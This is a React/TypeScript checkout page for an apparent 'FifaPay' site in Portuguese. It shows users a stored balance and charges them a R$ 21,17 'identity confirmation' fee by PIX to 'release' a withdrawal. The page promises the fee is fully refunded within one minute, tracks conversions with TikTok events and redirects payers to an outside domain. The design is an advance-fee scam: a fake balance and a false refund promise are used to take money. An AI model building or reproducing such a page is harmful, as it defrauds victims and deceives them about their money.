import { useEffect, useMemo, useRef, useState } from "react";
import {
  Check,
  CheckCircle2,
  Clock,
  Copy,
  Loader2,
  ShieldCheck,
  X,
} from "lucide-react";
import QRCode from "qrcode";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import logo from "@/assets/fifapay-logo.png";
import { ttqTrack, newEventId } from "@/lib/tiktok";

const formatBRL = (n: number) => n.toFixed(2).replace(".", ",");

const Confirmacao = () => {
  const balance = useMemo(
    () => parseFloat(sessionStorage.getItem("fifapay:balance") || "0") || 0,
    []
  );
  const fullName = sessionStorage.getItem("fifapay:pixName") || "—";
  const pixType = sessionStorage.getItem("fifapay:pixType") || "CPF";
  const pixKey = sessionStorage.getItem("fifapay:pixKey") || "";

  const fee = 21.17;

  const [now] = useState(() => new Date());
  const dataStr = `${String(now.getDate()).padStart(2, "0")}/${String(
    now.getMonth() + 1
  ).padStart(2, "0")}/${now.getFullYear()}, ${String(now.getHours()).padStart(
    2,
    "0"
  )}:${String(now.getMinutes()).padStart(2, "0")}`;

  // Checkout PIX state
  const [pixOpen, setPixOpen] = useState(false);
  const [pixLoading, setPixLoading] = useState(false);
  const [pixError, setPixError] = useState<string | null>(null);
  const [pixCode, setPixCode] = useState<string | null>(null);
  const [pixQrDataUrl, setPixQrDataUrl] = useState<string | null>(null);
  const [pixTxId, setPixTxId] = useState<string | number | null>(null);
  const [pixStatus, setPixStatus] =
    useState<"pending" | "approved" | "failed" | "refunded">("pending");
  const pollRef = useRef<number | null>(null);
  const timeoutRef = useRef<number | null>(null);
  const checkoutEventIdRef = useRef<string | null>(null);
  const completeEventIdRef = useRef<string | null>(null);

  const captureTracking = () => {
    const params = new URLSearchParams(window.location.search);
    const fields = [
      "utm_source",
      "utm_medium",
      "utm_campaign",
      "utm_content",
      "utm_term",
      "src",
      "sck",
    ];
    const t: Record<string, string> = {};
    fields.forEach((f) => {
      const v = params.get(f);
      if (v) t[f] = v;
    });
    return Object.keys(t).length > 0 ? t : null;
  };

  const stopPolling = () => {
    if (pollRef.current) {
      window.clearInterval(pollRef.current);
      pollRef.current = null;
    }
    if (timeoutRef.current) {
      window.clearTimeout(timeoutRef.current);
      timeoutRef.current = null;
    }
  };

  const startPolling = (txId: string | number) => {
    stopPolling();
    pollRef.current = window.setInterval(async () => {
      try {
        const { data, error } = await supabase.functions.invoke("paradise-pix", {
          body: { action: "status", transaction_id: txId },
        });
        if (error) return;
        const s = (data?.status || "pending") as
          | "pending"
          | "approved"
          | "failed"
          | "refunded";
        setPixStatus(s);
        if (s === "approved") {
          stopPolling();
          // TikTok: CompletePayment
          if (!completeEventIdRef.current) {
            completeEventIdRef.current = newEventId();
            ttqTrack(
              "CompletePayment",
              {
                value: fee,
                currency: "BRL",
                content_type: "product",
                content_id: "fifapay-liberacao-saque",
              },
              completeEventIdRef.current,
            );
            // server-side (CAPI) com mesmo event_id
            supabase.functions.invoke("paradise-pix", {
              body: {
                action: "tiktok_event",
                event: "CompletePayment",
                event_id: completeEventIdRef.current,
                value: fee,
                currency: "BRL",
                transaction_id: txId,
                url: window.location.href,
              },
            }).catch(() => {});
          }
          toast({
            title: "Pagamento confirmado!",
            description: "Liberando seu saque...",
          });
          setTimeout(() => {
            window.location.href =
              "https://sistemaonlineplay.online/check/index.html";
          }, 1200);
        } else if (s === "failed" || s === "refunded") {
          stopPolling();
        }
      } catch (_e) {
        /* keep polling */
      }
    }, 2000);
    timeoutRef.current = window.setTimeout(
      () => stopPolling(),
      15 * 60 * 1000
    );
  };

  useEffect(() => {
    window.scrollTo(0, 0);
    return () => stopPolling();
  }, []);

  const handlePay = async () => {
    setPixOpen(true);
    setPixLoading(true);
    setPixError(null);
    setPixCode(null);
    setPixQrDataUrl(null);
    setPixTxId(null);
    setPixStatus("pending");
    completeEventIdRef.current = null;
    try {
      const amountCents = Math.round(fee * 100); // R$ 21,17 => 2117
      const tracking = captureTracking();
      // TikTok: InitiateCheckout (client)
      const ckId = newEventId();
      checkoutEventIdRef.current = ckId;
      ttqTrack(
        "InitiateCheckout",
        {
          value: fee,
          currency: "BRL",
          content_type: "product",
          content_id: "fifapay-liberacao-saque",
        },
        ckId,
      );
      const { data, error } = await supabase.functions.invoke("paradise-pix", {
        body: {
          action: "create",
          amount: amountCents,
          description: "FifaPay - Liberação de saque",
          customer: {
            name: fullName !== "—" ? fullName : undefined,
            document: pixType === "CPF" ? pixKey : undefined,
          },
          tracking,
        },
      });
      if (error) throw new Error(error.message || "Falha ao gerar PIX");
      if (!data?.qr_code)
        throw new Error("PIX inválido retornado pelo servidor");
      setPixCode(data.qr_code);
      setPixTxId(data.transaction_id);
      // TikTok: InitiateCheckout (server / CAPI) com mesmo event_id
      supabase.functions.invoke("paradise-pix", {
        body: {
          action: "tiktok_event",
          event: "InitiateCheckout",
          event_id: ckId,
          value: fee,
          currency: "BRL",
          transaction_id: data.transaction_id,
          url: window.location.href,
        },
      }).catch(() => {});
      const dataUrl = await QRCode.toDataURL(data.qr_code, {
        width: 320,
        margin: 2,
      });
      setPixQrDataUrl(dataUrl);
      startPolling(data.transaction_id);
    } catch (e) {
      setPixError((e as Error).message || "Erro ao gerar PIX");
    } finally {
      setPixLoading(false);
    }
  };

  const closePix = () => {
    stopPolling();
    setPixOpen(false);
  };

  const copyPix = async () => {
    if (!pixCode) return;
    try {
      await navigator.clipboard.writeText(pixCode);
      toast({
        title: "Código PIX copiado!",
        description: "Cole no app do seu banco.",
      });
    } catch {
      toast({
        title: "Não foi possível copiar",
        description: "Selecione e copie manualmente.",
      });
    }
  };

  return (
    <div className="min-h-dvh w-full bg-gradient-to-b from-emerald-950 via-emerald-900 to-emerald-950 text-white safe-x">
      <div className="mx-auto max-w-md px-5 pb-10 pt-5">
        {/* Logo */}
        <div className="mb-5 flex justify-center">
          <img
            src={logo}
            alt="FifaPay"
            className="h-12 w-auto select-none object-contain drop-shadow-[0_6px_14px_rgba(250,204,21,0.25)]"
            draggable={false}
          />
        </div>

        <div className="mb-5 h-px w-full bg-emerald-700/40" />

        {/* Saldo disponível */}
        <div className="mb-4 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5 shadow-inner">
          <p className="text-xs font-bold uppercase tracking-wider text-yellow-400/95">
            Saldo disponível
          </p>
          <p className="mt-3 text-4xl font-display font-bold tabular-nums text-white">
            R$ {formatBRL(balance)}
          </p>
          <p className="mt-3 text-sm text-emerald-200/75">
            Aguardando confirmação para saque
          </p>
        </div>

        {/* Confirmação de identidade */}
        <div className="mb-4 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
          <p className="text-xs font-bold uppercase tracking-wider text-emerald-300/85">
            Confirmação de identidade
          </p>
          <div className="mt-3 flex flex-wrap items-center gap-3">
            <span className="text-3xl font-display font-bold text-rose-400">
              R$ {formatBRL(fee)}
            </span>
            <span className="rounded-full border border-emerald-500/60 px-3 py-1 text-[10px] font-bold uppercase tracking-wider text-emerald-200">
              Valor reembolsável
            </span>
          </div>
          <p className="mt-3 text-sm leading-relaxed text-emerald-100/85">
            Taxa obrigatória para liberação do saque no valor de{" "}
            <span className="font-bold">R$ {formatBRL(balance)}</span>. O valor
            de <span className="font-bold">R$ {formatBRL(fee)}</span> será
            reembolsado integralmente para você em 1 minuto.
          </p>
        </div>

        {/* CTA principal */}
        <div className="mb-5 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
          <button
            type="button"
            onClick={handlePay}
            className="flex h-14 w-full items-center justify-center rounded-xl bg-gradient-to-r from-yellow-400 to-amber-400 text-base font-display font-bold text-emerald-950 shadow-lg shadow-yellow-500/25 transition-all hover:from-yellow-300 hover:to-amber-300 active:scale-[0.99]"
          >
            Pagar taxa para Liberar Saque
          </button>
          <p className="mt-3 flex items-center justify-center gap-1.5 text-xs font-medium text-emerald-200/80">
            <Clock className="h-3.5 w-3.5" />
            Reembolso automático em 1 minuto
          </p>
        </div>

        {/* Dados para reembolso */}
        <div className="mb-5 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
          <p className="mb-4 text-xs font-bold uppercase tracking-wider text-emerald-300/85">
            Dados para reembolso
          </p>
          <Row label="Nome" value={fullName} />
          <Row label="Data" value={dataStr} />
          <Row label="Chave PIX" value={pixType} />
          <Row
            label="Valor a receber"
            value={`R$ ${formatBRL(balance)}`}
            valueClass="text-yellow-300 font-bold"
          />
          <div className="mt-3 rounded-xl border border-emerald-700/40 bg-emerald-950/80 px-4 py-3 text-center font-mono text-sm tracking-wider text-emerald-50">
            {pixKey || "—"}
          </div>
        </div>

        <div className="mb-5 h-px w-full bg-emerald-700/40" />

        {/* Processo de liberação */}
        <div className="mb-5 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
          <p className="mb-4 text-xs font-bold uppercase tracking-wider text-emerald-300/85">
            Processo de liberação
          </p>

          <Step
            indicator={<span className="text-yellow-400 font-bold">1</span>}
            indicatorBg="bg-emerald-900/70 border border-yellow-400/50"
            title="Pagar taxa de confirmação"
            titleClass="text-white"
            subtitle={`R$ ${formatBRL(fee)} para verificação de identidade`}
          />
          <Step
            indicator={<Check className="h-4 w-4 text-emerald-300" strokeWidth={3} />}
            indicatorBg="bg-emerald-800/80 border border-emerald-400/50"
            title="Receber reembolso automático"
            titleClass="text-emerald-300"
            subtitle="Valor devolvido em 1 minuto"
          />
          <Step
            indicator={<span className="text-yellow-400 font-bold">3</span>}
            indicatorBg="bg-emerald-900/70 border border-yellow-400/50"
            title="Acessar saldo completo"
            titleClass="text-white"
            subtitle={`R$ ${formatBRL(balance)} liberado para saque`}
            isLast
          />
        </div>

        {/* CTA final (repetido) */}
        <div className="rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
          <button
            type="button"
            onClick={handlePay}
            className="flex h-14 w-full items-center justify-center rounded-xl bg-gradient-to-r from-yellow-400 to-amber-400 text-base font-display font-bold text-emerald-950 shadow-lg shadow-yellow-500/25 transition-all hover:from-yellow-300 hover:to-amber-300 active:scale-[0.99]"
          >
            Pagar taxa para Liberar Saque
          </button>
          <p className="mt-3 flex items-center justify-center gap-1.5 text-xs font-medium text-emerald-200/80">
            <Clock className="h-3.5 w-3.5" />
            Reembolso automático em 1 minuto
          </p>
        </div>
      </div>

      {pixOpen && (
        <div className="fixed inset-0 z-50 overflow-y-auto bg-gradient-to-b from-emerald-950 via-emerald-900 to-emerald-950">
          <div className="mx-auto max-w-md px-5 pb-10 pt-5">
            {/* Header com logo e botão de fechar */}
            <div className="mb-5 flex items-center justify-between">
              <img
                src={logo}
                alt="FifaPay"
                className="h-10 w-auto select-none object-contain drop-shadow-[0_6px_14px_rgba(250,204,21,0.25)]"
                draggable={false}
              />
              <button
                type="button"
                onClick={closePix}
                className="grid h-9 w-9 place-items-center rounded-full bg-emerald-900/80 text-white ring-1 ring-emerald-700/40 hover:bg-emerald-800"
                aria-label="Fechar"
              >
                <X className="h-4 w-4" />
              </button>
            </div>

            <div className="mb-5 h-px w-full bg-emerald-700/40" />

            {/* Card de valor */}
            <div className="mb-4 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5 shadow-inner">
              <p className="text-xs font-bold uppercase tracking-wider text-yellow-400/95">
                Pagamento PIX
              </p>
              <p className="mt-3 text-4xl font-display font-bold tabular-nums text-white">
                R$ {formatBRL(fee)}
              </p>
              <p className="mt-3 text-sm text-emerald-200/75">
                Para liberar{" "}
                <span className="font-bold text-yellow-300">
                  R$ {formatBRL(balance)}
                </span>
              </p>
            </div>

            {/* Card principal: QR + código */}
            <div className="mb-4 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
              <p className="mb-4 text-xs font-bold uppercase tracking-wider text-emerald-300/85">
                Escaneie o QR-Code ou copie o código
              </p>

              {pixLoading && (
                <div className="flex flex-col items-center justify-center py-10">
                  <Loader2 className="h-10 w-10 animate-spin text-yellow-400" />
                  <p className="mt-4 text-sm text-emerald-100/85">
                    Gerando código PIX...
                  </p>
                </div>
              )}

              {!pixLoading && pixError && (
                <div className="rounded-xl border border-rose-500/40 bg-rose-950/40 p-4 text-center">
                  <p className="text-sm font-bold text-rose-300">
                    Não foi possível gerar o PIX
                  </p>
                  <p className="mt-1 text-xs text-rose-200/80">{pixError}</p>
                  <button
                    type="button"
                    onClick={handlePay}
                    className="mt-4 inline-flex h-10 items-center rounded-lg bg-yellow-400 px-4 text-sm font-bold text-emerald-950 hover:bg-yellow-300"
                  >
                    Tentar novamente
                  </button>
                </div>
              )}

              {!pixLoading && !pixError && pixQrDataUrl && (
                <>
                  <div className="mx-auto flex w-fit items-center justify-center rounded-2xl bg-white p-3 shadow-lg shadow-yellow-500/10 ring-2 ring-yellow-400/30">
                    <img
                      src={pixQrDataUrl}
                      alt="QR Code PIX"
                      className="h-56 w-56"
                    />
                  </div>

                  <div className="mt-5 flex items-center justify-between border-y border-emerald-800/60 py-3">
                    <span className="text-sm font-medium text-emerald-300/85">
                      Valor PIX:
                    </span>
                    <span className="text-lg font-display font-bold text-white">
                      R$ {formatBRL(fee)}
                    </span>
                  </div>

                  <div className="mt-3 max-h-20 overflow-auto break-all rounded-lg border border-emerald-800/60 bg-emerald-950/80 p-3 font-mono text-[11px] leading-relaxed text-emerald-100/85">
                    {pixCode}
                  </div>

                  <button
                    type="button"
                    onClick={copyPix}
                    className="mt-4 flex h-12 w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-yellow-400 to-amber-400 text-sm font-display font-bold text-emerald-950 shadow-lg shadow-yellow-500/25 hover:from-yellow-300 hover:to-amber-300 active:scale-[0.99]"
                  >
                    <Copy className="h-4 w-4" />
                    Copiar código PIX
                  </button>

                  <div className="mt-4 flex items-center justify-center gap-2 rounded-lg bg-emerald-900/60 px-3 py-2 text-xs text-emerald-100/85">
                    {pixStatus === "pending" && (
                      <>
                        <Loader2 className="h-3.5 w-3.5 animate-spin text-yellow-400" />
                        Aguardando pagamento...
                      </>
                    )}
                    {pixStatus === "approved" && (
                      <>
                        <Check className="h-3.5 w-3.5 text-emerald-300" />
                        Pagamento confirmado!
                      </>
                    )}
                    {(pixStatus === "failed" || pixStatus === "refunded") && (
                      <span className="text-rose-300">
                        Pagamento não concluído.
                      </span>
                    )}
                  </div>
                </>
              )}
            </div>

            {/* Como pagar */}
            {!pixLoading && !pixError && pixQrDataUrl && (
              <div className="mb-4 rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
                <p className="mb-4 text-xs font-bold uppercase tracking-wider text-emerald-300/85">
                  Como pagar
                </p>
                <ol className="space-y-3">
                  {[
                    "Abra o aplicativo do seu banco e selecione PIX",
                    "Escolha pagar usando QR Code ou Pix Copia e Cola",
                    "Confirme os detalhes do pagamento e o destinatário",
                    "Conclua o pagamento — você será redirecionado automaticamente",
                  ].map((txt, i) => (
                    <li key={i} className="flex items-start gap-3">
                      <span className="grid h-6 w-6 shrink-0 place-items-center rounded-full bg-yellow-400 text-xs font-bold text-emerald-950">
                        {i + 1}
                      </span>
                      <p className="text-sm leading-relaxed text-emerald-100/90">
                        {txt}
                      </p>
                    </li>
                  ))}
                </ol>
              </div>
            )}

            {/* Segurança */}
            <div className="rounded-2xl border border-emerald-700/40 bg-emerald-950/70 p-5">
              <p className="text-sm text-emerald-100/90">
                Seus dados são armazenados de forma totalmente segura, sendo
                utilizados apenas para:
              </p>
              <ul className="mt-4 flex flex-col gap-3">
                {[
                  "Envio do comprovante de pagamento",
                  "Garantia de reembolso em até 1 minuto",
                  "Acompanhamento da liberação do seu saque",
                ].map((txt) => (
                  <li key={txt} className="flex items-center gap-3">
                    <CheckCircle2 className="h-5 w-5 shrink-0 text-emerald-300" />
                    <span className="text-sm text-emerald-200/85">{txt}</span>
                  </li>
                ))}
              </ul>
              <div className="mt-5 flex flex-col items-center justify-center gap-2">
                <ShieldCheck className="h-6 w-6 text-emerald-300" />
                <p className="text-center text-xs text-emerald-200/70">
                  Ao finalizar o pagamento você concorda com nossos termos de
                  uso e privacidade.
                </p>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const Row = ({
  label,
  value,
  valueClass = "text-white",
}: {
  label: string;
  value: string;
  valueClass?: string;
}) => (
  <div className="flex items-center justify-between border-b border-emerald-800/50 py-3 last:border-b-0">
    <span className="text-sm text-emerald-300/85">{label}</span>
    <span className={`text-sm ${valueClass}`}>{value}</span>
  </div>
);

const Step = ({
  indicator,
  indicatorBg,
  title,
  titleClass,
  subtitle,
  isLast = false,
}: {
  indicator: React.ReactNode;
  indicatorBg: string;
  title: string;
  titleClass: string;
  subtitle: string;
  isLast?: boolean;
}) => (
  <div className={`flex items-start gap-3 ${isLast ? "" : "mb-4"}`}>
    <div
      className={`flex h-9 w-9 shrink-0 items-center justify-center rounded-lg ${indicatorBg}`}
    >
      {indicator}
    </div>
    <div className="min-w-0 flex-1 pt-0.5">
      <p className={`text-sm font-display font-bold ${titleClass}`}>{title}</p>
      <p className="mt-0.5 text-xs text-emerald-200/70">{subtitle}</p>
    </div>
  </div>
);

export default Confirmacao;